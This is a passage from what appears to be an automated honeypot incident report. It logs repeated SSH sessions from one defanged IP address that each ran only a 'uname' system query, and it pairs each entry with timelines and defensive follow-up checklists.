| `2026-07-19 10:25:41` | `cowrie.session.params` |
| `2026-07-19 10:25:41` | `cowrie.command.input` |
| `2026-07-19 10:25:45` | `cowrie.log.closed` |
| `2026-07-19 10:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370c1046b87e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:33` | `cowrie.session.connect` |
| `2026-07-19 10:25:36` | `cowrie.client.version` |
| `2026-07-19 10:25:36` | `cowrie.client.kex` |
| `2026-07-19 10:25:48` | `cowrie.login.success` |
| `2026-07-19 10:25:54` | `cowrie.session.params` |
| `2026-07-19 10:25:54` | `cowrie.command.input` |
| `2026-07-19 10:25:57` | `cowrie.log.closed` |
| `2026-07-19 10:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df63858c4256

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:26 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:48` | `cowrie.session.connect` |
| `2026-07-19 10:25:50` | `cowrie.client.version` |
| `2026-07-19 10:25:50` | `cowrie.client.kex` |
| `2026-07-19 10:26:03` | `cowrie.login.success` |
| `2026-07-19 10:26:09` | `cowrie.session.params` |
| `2026-07-19 10:26:09` | `cowrie.command.input` |
| `2026-07-19 10:26:14` | `cowrie.log.closed` |
| `2026-07-19 10:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c3fbd0f07a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:26 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:57` | `cowrie.session.connect` |
| `2026-07-19 10:26:01` | `cowrie.client.version` |
| `2026-07-19 10:26:01` | `cowrie.client.kex` |
| `2026-07-19 10:26:14` | `cowrie.login.success` |
| `2026-07-19 10:26:21` | `cowrie.session.params` |
| `2026-07-19 10:26:21` | `cowrie.command.input` |
| `2026-07-19 10:26:25` | `cowrie.log.closed` |
| `2026-07-19 10:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c4a70d7274

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:26 |
| **Last Seen** | 2026-07-19 10:26 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:26:08` | `cowrie.session.connect` |
| `2026-07-19 10:26:11` | `cowrie.client.version` |
| `2026-07-19 10:26:11` | `cowrie.client.kex` |
| `2026-07-19 10:26:26` | `cowrie.login.success` |
| `2026-07-19 10:26:37` | `cowrie.session.params` |
| `2026-07-19 10:26:37` | `cowrie.command.input` |
| `2026-07-19 10:26:41` | `cowrie.log.closed` |
| `2026-07-19 10:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4bf65ee945

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:26 |
| **Last Seen** | 2026-07-19 10:26 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:26:21` | `cowrie.session.connect` |
| `2026-07-19 10:26:24` | `cowrie.client.version` |
| `2026-07-19 10:26:24` | `cowrie.client.kex` |
| `2026-07-19 10:26:41` | `cowrie.login.success` |
| `2026-07-19 10:26:50` | `cowrie.session.params` |
| `2026-07-19 10:26:50` | `cowrie.command.input` |
| `2026-07-19 10:26:53` | `cowrie.log.closed` |
| `2026-07-19 10:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0b363625088

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:26 |
| **Last Seen** | 2026-07-19 10:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:26:36` | `cowrie.session.connect` |
| `2026-07-19 10:26:39` | `cowrie.client.version` |
| `2026-07-19 10:26:39` | `cowrie.client.kex` |
| `2026-07-19 10:26:53` | `cowrie.login.success` |
| `2026-07-19 10:27:00` | `cowrie.session.params` |
| `2026-07-19 10:27:00` | `cowrie.command.input` |
| `2026-07-19 10:27:02` | `cowrie.log.closed` |
| `2026-07-19 10:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596458cb5a67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:26 |
| **Last Seen** | 2026-07-19 10:27 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:26:45` | `cowrie.session.connect` |
| `2026-07-19 10:26:50` | `cowrie.client.version` |
| `2026-07-19 10:26:50` | `cowrie.client.kex` |
| `2026-07-19 10:27:02` | `cowrie.login.success` |
| `2026-07-19 10:27:10` | `cowrie.session.params` |
| `2026-07-19 10:27:10` | `cowrie.command.input` |
| `2026-07-19 10:27:13` | `cowrie.log.closed` |
| `2026-07-19 10:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165b01f80794

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:27 |
| **Last Seen** | 2026-07-19 10:27 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:27:03` | `cowrie.session.connect` |
| `2026-07-19 10:27:07` | `cowrie.client.version` |
| `2026-07-19 10:27:07` | `cowrie.client.kex` |
| `2026-07-19 10:27:21` | `cowrie.login.success` |
| `2026-07-19 10:27:29` | `cowrie.session.params` |
| `2026-07-19 10:27:29` | `cowrie.command.input` |
| `2026-07-19 10:27:32` | `cowrie.log.closed` |
| `2026-07-19 10:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7649affc25d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:27 |
| **Last Seen** | 2026-07-19 10:27 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:27:14` | `cowrie.session.connect` |
| `2026-07-19 10:27:18` | `cowrie.client.version` |
| `2026-07-19 10:27:18` | `cowrie.client.kex` |
| `2026-07-19 10:27:34` | `cowrie.login.success` |
| `2026-07-19 10:27:42` | `cowrie.session.params` |
| `2026-07-19 10:27:42` | `cowrie.command.input` |
| `2026-07-19 10:27:46` | `cowrie.log.closed` |
| `2026-07-19 10:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92de5b54f7a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:27 |
| **Last Seen** | 2026-07-19 10:27 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:27:28` | `cowrie.session.connect` |
| `2026-07-19 10:27:31` | `cowrie.client.version` |
| `2026-07-19 10:27:31` | `cowrie.client.kex` |
| `2026-07-19 10:27:48` | `cowrie.login.success` |
| `2026-07-19 10:27:54` | `cowrie.session.params` |
| `2026-07-19 10:27:54` | `cowrie.command.input` |
| `2026-07-19 10:27:57` | `cowrie.log.closed` |
| `2026-07-19 10:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc2d3691beae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:27 |
| **Last Seen** | 2026-07-19 10:28 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:27:40` | `cowrie.session.connect` |
| `2026-07-19 10:27:44` | `cowrie.client.version` |
| `2026-07-19 10:27:44` | `cowrie.client.kex` |
| `2026-07-19 10:27:58` | `cowrie.login.success` |
| `2026-07-19 10:28:02` | `cowrie.session.params` |
| `2026-07-19 10:28:02` | `cowrie.command.input` |
| `2026-07-19 10:28:04` | `cowrie.log.closed` |
| `2026-07-19 10:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc561eeeee8f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:27 |
| **Last Seen** | 2026-07-19 10:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:27:58` | `cowrie.session.connect` |
| `2026-07-19 10:27:59` | `cowrie.client.version` |
| `2026-07-19 10:27:59` | `cowrie.client.kex` |
| `2026-07-19 10:28:07` | `cowrie.login.success` |
| `2026-07-19 10:28:12` | `cowrie.session.params` |
| `2026-07-19 10:28:12` | `cowrie.command.input` |
| `2026-07-19 10:28:14` | `cowrie.log.closed` |
| `2026-07-19 10:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc2776368c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:28 |
| **Last Seen** | 2026-07-19 10:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:28:12` | `cowrie.session.connect` |
| `2026-07-19 10:28:13` | `cowrie.client.version` |
| `2026-07-19 10:28:13` | `cowrie.client.kex` |
| `2026-07-19 10:28:23` | `cowrie.login.success` |
| `2026-07-19 10:28:27` | `cowrie.session.params` |
| `2026-07-19 10:28:27` | `cowrie.command.input` |
| `2026-07-19 10:28:31` | `cowrie.log.closed` |
| `2026-07-19 10:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f14dda6925

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:28 |
| **Last Seen** | 2026-07-19 10:28 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:28:25` | `cowrie.session.connect` |
| `2026-07-19 10:28:27` | `cowrie.client.version` |
| `2026-07-19 10:28:27` | `cowrie.client.kex` |
| `2026-07-19 10:28:36` | `cowrie.login.success` |
| `2026-07-19 10:28:39` | `cowrie.session.params` |
| `2026-07-19 10:28:39` | `cowrie.command.input` |
| `2026-07-19 10:28:42` | `cowrie.log.closed` |
| `2026-07-19 10:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bbe97a7abc4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:28 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:28:38` | `cowrie.session.connect` |
| `2026-07-19 10:28:40` | `cowrie.client.version` |
| `2026-07-19 10:28:40` | `cowrie.client.kex` |
| `2026-07-19 10:28:54` | `cowrie.login.success` |
| `2026-07-19 10:29:01` | `cowrie.session.params` |
| `2026-07-19 10:29:01` | `cowrie.command.input` |
| `2026-07-19 10:29:06` | `cowrie.log.closed` |
| `2026-07-19 10:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc332ea8cc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:28 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:28:45` | `cowrie.session.connect` |
| `2026-07-19 10:28:50` | `cowrie.client.version` |
| `2026-07-19 10:28:50` | `cowrie.client.kex` |
| `2026-07-19 10:29:05` | `cowrie.login.success` |
| `2026-07-19 10:29:11` | `cowrie.session.params` |
| `2026-07-19 10:29:11` | `cowrie.command.input` |
| `2026-07-19 10:29:14` | `cowrie.log.closed` |
| `2026-07-19 10:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489426da5471

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:28 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:28:58` | `cowrie.session.connect` |
| `2026-07-19 10:29:01` | `cowrie.client.version` |
| `2026-07-19 10:29:01` | `cowrie.client.kex` |
| `2026-07-19 10:29:14` | `cowrie.login.success` |
| `2026-07-19 10:29:22` | `cowrie.session.params` |
| `2026-07-19 10:29:22` | `cowrie.command.input` |
| `2026-07-19 10:29:22` | `cowrie.log.closed` |
| `2026-07-19 10:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054dca45f34a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:29 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:29:12` | `cowrie.session.connect` |
| `2026-07-19 10:29:15` | `cowrie.client.version` |
| `2026-07-19 10:29:15` | `cowrie.client.kex` |
| `2026-07-19 10:29:23` | `cowrie.login.success` |
| `2026-07-19 10:29:24` | `cowrie.session.params` |
| `2026-07-19 10:29:24` | `cowrie.command.input` |
| `2026-07-19 10:29:24` | `cowrie.log.closed` |
| `2026-07-19 10:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6bc2a9662c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:29 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:29:37` | `cowrie.session.connect` |
| `2026-07-19 10:29:37` | `cowrie.client.version` |
| `2026-07-19 10:29:37` | `cowrie.client.kex` |
| `2026-07-19 10:29:39` | `cowrie.login.success` |
| `2026-07-19 10:29:40` | `cowrie.session.params` |
| `2026-07-19 10:29:40` | `cowrie.command.input` |
| `2026-07-19 10:29:41` | `cowrie.log.closed` |
| `2026-07-19 10:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3513ec4542f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:29 |
| **Last Seen** | 2026-07-19 10:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:29:49` | `cowrie.session.connect` |
| `2026-07-19 10:29:49` | `cowrie.client.version` |
| `2026-07-19 10:29:49` | `cowrie.client.kex` |
| `2026-07-19 10:29:53` | `cowrie.login.success` |
| `2026-07-19 10:29:55` | `cowrie.session.params` |
| `2026-07-19 10:29:55` | `cowrie.command.input` |
| `2026-07-19 10:29:56` | `cowrie.log.closed` |
| `2026-07-19 10:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e987bdc9f56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:30 |
| **Last Seen** | 2026-07-19 10:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:30:01` | `cowrie.session.connect` |
| `2026-07-19 10:30:02` | `cowrie.client.version` |
| `2026-07-19 10:30:02` | `cowrie.client.kex` |
| `2026-07-19 10:30:10` | `cowrie.login.success` |
| `2026-07-19 10:30:16` | `cowrie.session.params` |
| `2026-07-19 10:30:16` | `cowrie.command.input` |
| `2026-07-19 10:30:18` | `cowrie.log.closed` |
| `2026-07-19 10:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61702a3b7116

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:30 |
| **Last Seen** | 2026-07-19 10:30 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:30:11` | `cowrie.session.connect` |
| `2026-07-19 10:30:14` | `cowrie.client.version` |
| `2026-07-19 10:30:14` | `cowrie.client.kex` |
| `2026-07-19 10:30:21` | `cowrie.login.success` |
| `2026-07-19 10:30:24` | `cowrie.session.params` |
| `2026-07-19 10:30:24` | `cowrie.command.input` |
| `2026-07-19 10:30:26` | `cowrie.log.closed` |
| `2026-07-19 10:30:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104b82f831e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:30 |
| **Last Seen** | 2026-07-19 10:30 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:30:27` | `cowrie.session.connect` |
| `2026-07-19 10:30:28` | `cowrie.client.version` |
| `2026-07-19 10:30:28` | `cowrie.client.kex` |
| `2026-07-19 10:30:35` | `cowrie.login.success` |
| `2026-07-19 10:30:41` | `cowrie.session.params` |
| `2026-07-19 10:30:41` | `cowrie.command.input` |
| `2026-07-19 10:30:43` | `cowrie.log.closed` |
| `2026-07-19 10:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f00881ca42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:30 |
| **Last Seen** | 2026-07-19 10:30 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:30:36` | `cowrie.session.connect` |
| `2026-07-19 10:30:39` | `cowrie.client.version` |
| `2026-07-19 10:30:39` | `cowrie.client.kex` |
| `2026-07-19 10:30:45` | `cowrie.login.success` |
| `2026-07-19 10:30:49` | `cowrie.session.params` |
| `2026-07-19 10:30:49` | `cowrie.command.input` |
| `2026-07-19 10:30:51` | `cowrie.log.closed` |
| `2026-07-19 10:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524c1c2fbb34

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:30 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:30:52` | `cowrie.session.connect` |
| `2026-07-19 10:30:53` | `cowrie.client.version` |
| `2026-07-19 10:30:53` | `cowrie.client.kex` |
| `2026-07-19 10:31:01` | `cowrie.login.success` |
| `2026-07-19 10:31:04` | `cowrie.session.params` |
| `2026-07-19 10:31:04` | `cowrie.command.input` |
| `2026-07-19 10:31:06` | `cowrie.log.closed` |
| `2026-07-19 10:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ab75b85b48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
